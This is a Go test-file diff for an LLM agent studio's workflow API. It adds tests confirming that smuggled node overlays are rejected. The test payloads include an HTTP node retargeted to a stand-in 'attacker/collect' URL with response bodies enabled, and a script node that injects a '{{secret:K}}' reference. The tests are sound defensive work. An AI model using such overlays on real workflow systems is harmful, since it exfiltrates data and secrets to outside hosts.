@@ -9,6 +9,7 @@ import (
 	"testing"
 
 	"github.com/costa92/llm-agent-contract/llm"
+	"github.com/costa92/llm-agent-studio/internal/customnodetype"
 	"github.com/costa92/llm-agent-studio/internal/planner"
 	"github.com/costa92/llm-agent-studio/internal/workflows"
 )
@@ -55,7 +56,7 @@ func (recordingPlanner) PlanWith(_ context.Context, _ string, _ llm.ChatModel, _
 }
 
 func TestCreateWorkflowHandlerRejectsEmptyName(t *testing.T) {
-	h := createWorkflowHandler(&stubWorkflows{})
+	h := createWorkflowHandler(stubProjects{orgID: "o1"}, &stubWorkflows{}, nil)
 	req := httptest.NewRequest("POST", "/api/projects/p1/workflows", strings.NewReader(`{"name":""}`))
 	req.SetPathValue("id", "p1")
 	rr := httptest.NewRecorder()
@@ -67,7 +68,7 @@ func TestCreateWorkflowHandlerRejectsEmptyName(t *testing.T) {
 
 func TestCreateWorkflowHandlerHappy(t *testing.T) {
 	ws := &stubWorkflows{}
-	h := createWorkflowHandler(ws)
+	h := createWorkflowHandler(stubProjects{orgID: "o1"}, ws, nil)
 	body := `{"name":"工作流 A","nodes":[{"id":"n1","type":"script","promptId":"","dependsOn":[]}]}`
 	req := httptest.NewRequest("POST", "/api/projects/p1/workflows", strings.NewReader(body))
 	req.SetPathValue("id", "p1")
@@ -132,7 +133,7 @@ func TestRunWorkflowHandlerEmptyNodes(t *testing.T) {
 func TestCreateWorkflow_RejectsCycle(t *testing.T) {
 	// ws.Create will fail the test if called — cycle must be caught before the store.
 	ws := &cycleRejectingWorkflows{t: t}
-	h := createWorkflowHandler(ws)
+	h := createWorkflowHandler(stubProjects{orgID: "o1"}, ws, nil)
 	// A↔B cycle.
 	body := `{"name":"cycle-wf","nodes":[{"id":"A","type":"script","dependsOn":["B"]},{"id":"B","type":"storyboard","dependsOn":["A"]}]}`
 	req := httptest.NewRequest("POST", "/api/projects/p1/workflows", strings.NewReader(body))
@@ -150,7 +151,7 @@ func TestCreateWorkflow_RejectsCycle(t *testing.T) {
 func TestUpdateWorkflow_RejectsCycle(t *testing.T) {
 	// ws.Update will fail the test if called — cycle must be caught before the store.
 	ws := &cycleRejectingWorkflows{t: t}
-	h := updateWorkflowHandler(ws)
+	h := updateWorkflowHandler(stubProjects{orgID: "o1"}, ws, nil)
 	body := `{"name":"cycle-wf","nodes":[{"id":"A","type":"script","dependsOn":["B"]},{"id":"B","type":"storyboard","dependsOn":["A"]}]}`
 	req := httptest.NewRequest("PUT", "/api/projects/p1/workflows/w1", strings.NewReader(body))
 	req.SetPathValue("id", "p1")
@@ -245,4 +246,75 @@ func TestRunWorkflowHandlerRefusesCustomNodes(t *testing.T) {
 func (rp *recordingPlanner) PlanCustom(_ context.Context, _, workflowID string, _ planner.Brief, _ []planner.WorkflowNode, _ map[string]planner.ResolvedType) (planner.Result, error) {
 	rp.gotWorkflowID = workflowID
 	return planner.Result{PlanID: "pl", Valid: true, ReadyTodos: []planner.ReadyTodo{{ID: "t1", Type: "script"}}}, nil
+}
+
+// TestCreateWorkflowRejectsRegistryOnlyOverlay (W1 create) [DB]: a node overlay
+// that smuggles a RegistryOnly field (http url retargeted + allowResponseBody:true)
+// must be rejected with 400 at SAVE, before the store write.
+func TestCreateWorkflowRejectsRegistryOnlyOverlay(t *testing.T) {
+	store := mergeTestStore(t)
+	org := "org-" + t.Name()
+	base, _ := json.Marshal(map[string]any{"method": "GET", "url": "https://api.example.com", "outputFormat": "text"})
+	ct, err := store.Create(context.Background(), org, customnodetype.UpsertInput{Label: "fetch", Kind: "http", Params: base})
+	if err != nil {
+		t.Fatalf("seed: %v", err)
+	}
+	ws := &cycleRejectingWorkflows{t: t} // Create must NOT be called
+	h := createWorkflowHandler(stubProjects{orgID: org}, ws, store)
+	body := `{"name":"wf1","nodes":[{"id":"n1","type":"custom:fetch","typeId":"` + ct.ID + `","dependsOn":[],"typeVersion":1,"parameters":{"url":"http://attacker/collect","allowResponseBody":true}}]}`
+	req := httptest.NewRequest("POST", "/api/projects/p1/workflows", strings.NewReader(body))
+	req.SetPathValue("id", "p1")
+	rr := httptest.NewRecorder()
+	h(rr, req)
+	if rr.Code != http.StatusBadRequest {
+		t.Fatalf("RegistryOnly overlay must be rejected at create, got %d: %s", rr.Code, rr.Body.String())
+	}
+	// Opaque: the rejected attacker URL must NOT leak into the response body.
+	if strings.Contains(rr.Body.String(), "attacker") {
+		t.Fatalf("error body leaked attacker payload: %s", rr.Body.String())
+	}
+}
+
+// TestUpdateWorkflowRejectsRegistryOnlyOverlay (W1 update) [DB].
+func TestUpdateWorkflowRejectsRegistryOnlyOverlay(t *testing.T) {
+	store := mergeTestStore(t)
+	org := "org-" + t.Name()
+	base, _ := json.Marshal(map[string]any{"code": "print(1)", "outputFormat": "text"})
+	ct, err := store.Create(context.Background(), org, customnodetype.UpsertInput{Label: "code", Kind: "script", Params: base})
+	if err != nil {
+		t.Fatalf("seed: %v", err)
+	}
+	ws := &cycleRejectingWorkflows{t: t} // Update must NOT be called
+	h := updateWorkflowHandler(stubProjects{orgID: org}, ws, store)
+	body := `{"name":"wf1","nodes":[{"id":"n1","type":"custom:code","typeId":"` + ct.ID + `","dependsOn":[],"typeVersion":1,"parameters":{"code":"x = {{secret:K}}"}}]}`
+	req := httptest.NewRequest("PUT", "/api/projects/p1/workflows/w1", strings.NewReader(body))
+	req.SetPathValue("id", "p1")
+	req.SetPathValue("wfId", "w1")
+	rr := httptest.NewRecorder()
+	h(rr, req)
+	if rr.Code != http.StatusBadRequest {
+		t.Fatalf("RegistryOnly overlay must be rejected at update, got %d: %s", rr.Code, rr.Body.String())
+	}
+}
+
+// TestCreateWorkflowAcceptsCleanOverlay (W1 create) [DB]: a non-dangerous overlay
+// (outputFormat=json) merges cleanly and the save proceeds to the store.
+func TestCreateWorkflowAcceptsCleanOverlay(t *testing.T) {
+	store := mergeTestStore(t)
+	org := "org-" + t.Name()
+	base, _ := json.Marshal(map[string]any{"method": "GET", "url": "https://api.example.com", "outputFormat": "text"})
+	ct, err := store.Create(context.Background(), org, customnodetype.UpsertInput{Label: "fetch", Kind: "http", Params: base})
+	if err != nil {
+		t.Fatalf("seed: %v", err)
+	}
+	ws := &stubWorkflows{}
+	h := createWorkflowHandler(stubProjects{orgID: org}, ws, store)
+	body := `{"name":"wf1","nodes":[{"id":"n1","type":"custom:fetch","typeId":"` + ct.ID + `","dependsOn":[],"typeVersion":1,"parameters":{"outputFormat":"json"}}]}`
+	req := httptest.NewRequest("POST", "/api/projects/p1/workflows", strings.NewReader(body))
+	req.SetPathValue("id", "p1")
+	rr := httptest.NewRecorder()
+	h(rr, req)
+	if rr.Code != http.StatusOK {
+		t.Fatalf("clean overlay should 200, got %d: %s", rr.Code, rr.Body.String())
+	}
 }
